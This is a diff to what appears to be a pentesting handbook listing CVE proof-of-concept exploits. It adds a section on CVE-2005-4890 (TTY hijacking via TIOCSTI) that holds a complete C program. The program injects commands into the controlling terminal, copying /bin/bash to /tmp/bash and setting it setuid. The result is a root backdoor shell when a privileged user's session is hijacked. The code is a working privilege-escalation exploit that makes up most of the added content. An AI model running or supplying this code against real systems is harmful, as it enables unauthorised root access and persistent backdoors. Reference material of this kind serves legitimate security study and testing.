@@ -5,6 +5,7 @@
 
 ## Table of Contents
 
+- [CVE-2005-4890: TTY Hijacking / TTY Input Pushback via TIOCSTI](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2005-4890-TTY-Hijacking--TTY-Input-Pushback-via-TIOCSTI)
 - [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2014-6271-Shellshock-RCE-PoC)
 - [CVE-2016-1531: exim LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2016-1531-exim-LPE)
 - [CVE-2019-14287: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2019-14287-Sudo-Bypass)
@@ -134,6 +135,33 @@
 | n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
 | n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
 | n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |
+
+## CVE-2005-4890: TTY Hijacking / TTY Input Pushback via TIOCSTI
+
+> https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking
+
+```c
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/ioctl.h>
+int main() {
+    int fd = open("/dev/tty", O_RDWR);
+    if (fd < 0) {
+        perror("open");
+        return -1;
+    }
+    char *x = "exit\ncp /bin/bash /tmp/bash; chmod u+s /tmp/bash\n";
+    while (*x != 0) {
+        int ret = ioctl(fd, TIOCSTI, x);
+        if (ret == -1) {
+            perror("ioctl()");
+        }
+        x++;
+    }
+    return 0;
+}
+```
 
 ## CVE-2014-6271: Shellshock RCE PoC
 
